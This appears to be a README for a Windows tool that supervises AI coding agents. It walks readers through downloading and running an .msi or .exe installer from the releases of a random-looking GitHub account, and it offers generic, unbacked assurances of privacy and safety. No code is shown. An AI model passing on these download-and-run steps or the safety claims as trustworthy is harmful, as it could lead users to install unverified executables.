# 🤖 agent-supervision-skills - Supervise local AI coding agents securely

[![](https://img.shields.io/badge/Download-Agent_Supervision-blue)](https://github.com/drippy-passport968/agent-supervision-skills)

This tool helps you monitor and manage AI agents on your Windows computer. It works with Claude Code, Codex, and Kimi Code. You keep total control over what your AI coding assistant does. The software tracks every action the agent takes. This ensures you know exactly what happened during your coding tasks.

## 📁 Why use this tool

Modern coding agents act fast. They write and modify files on your computer. Sometimes, you need to know exactly how a change happened. This software acts as a layer between your agent and your files. It logs every action. It asks for your permission for sensitive tasks. It keeps your workspace clean and safe.

## ⚙️ System requirements

- Windows 10 or Windows 11
- 4 GB of free disk space
- PowerShell version 5.1 or newer
- An active installation of Claude Code, Codex, or Kimi Code

## 📥 Downloading the software

You must visit the main repository page to get the latest version. This page contains all necessary files for your system.

[Click here to visit the download page](https://github.com/drippy-passport968/agent-supervision-skills)

1. Open the link above in your web browser.
2. Look for the section labeled Releases on the right side of the screen.
3. Click the text showing the latest version number.
4. Locate the file ending in .msi or .exe under the Assets heading.
5. Save the file to your Downloads folder.

## 🚀 Setting up the software

Follow these steps to install the tool on your Windows machine.

1. Locate the file you saved in your Downloads folder.
2. Double-click the file to start the installation.
3. Follow the prompts on your screen.
4. Click Finish when the progress bar completes.
5. Open your Start menu and type Agent Supervision to find the application.
6. Click the icon to launch the program for the first time.

## 🛠️ Configuring your agents

The tool needs to see your existing AI agents to supervise them.

1. Open the Agent Supervision app.
2. Go to the Settings tab.
3. Click the Add Agent button.
4. Select the folder where you installed Claude Code, Codex, or Kimi Code.
5. The app detects your agents automatically.
6. Confirm the selection to enable monitoring.

## 📋 Using the interface

The main dashboard shows your current activity. You see a list of recent commands. Each command shows the status, the time, and the files affected.

- Green status means the action finished safely.
- Yellow status means the action waits for your approval.
- Red status means the agent encountered an error.

To approve a pending action, click the request in the list. Review the details shown in the side panel. Click the Approve button if you trust the action. Click Reject if you want to stop the agent from finishing that task.

## 🔍 Understanding logs

The tool saves every event in a log file. You find these files in the Logs folder within the application directory. You can open these files with any text editor like Notepad. Each line contains a time stamp, the agent name, the exact command, and the outcome. Use these logs to debug issues if an agent behaves in an unexpected way.

## 🔐 Security features

Your data stays on your local machine. This tool does not send information to any external server. Everything happens inside your computer. You control the connection between the agent and your files. This approach keeps your code private. No third party sees your project work.

## 💬 Troubleshooting common issues

If the application fails to open, restart your computer. Sometimes Windows needs a refresh to register new software.

If your agent does not appear in the list, verify the installation path. Check the folder settings in the app again. Ensure you have the latest version of your AI agent software.

If you see an error window, take a screenshot. Send this to the issue tracker on the main GitHub page. Include details about your version of Windows. This helps fix problems quickly.

## 🌐 Updating the software

Updates arrive periodically to fix bugs. Visit the download page again to check for new files. If a new version exists, download the setup file. Run the file to overwrite the old version. You do not need to uninstall the old version first. Your settings remain saved during this process.

## 📑 Understanding the tool flow

The software uses a local bridge. When your agent attempts to change a file, it sends a message to this bridge. The bridge pauses the agent. It waits for your input. Once you click approve, the bridge lets the agent continue. This simple loop keeps your system protected. It adds almost no delay to your coding process. You stay productive while staying in charge.

## 📦 Managing multiple agents

You can run multiple agents at once. The dashboard shows a separate tab for each one. This helps you monitor different projects at the same time. You switch between agents using the tabs at the top of the screen. Each agent has its own set of rules. You can set the agent for a specific project to be more or less strict. Use the settings for each specific agent to adjust these levels.

## 🗄️ Keeping your work safe

Regularly backup your project folders. While the supervision tool protects your files, hardware errors still happen. Use standard Windows backup tools to keep your data secure. The supervision tool provides a layer of safety, but it does not replace the need for backups.

## 🧠 Pro tips for power users

You can pin the monitor to your taskbar. Right-click the icon after you open it. Choose Pin to taskbar. This gives you quick access to the approval screen. If you find the notifications too frequent, change the sensitivity settings in the Preferences menu. You can choose to only monitor file deletions instead of all file changes. Balance the level of protection with your comfort.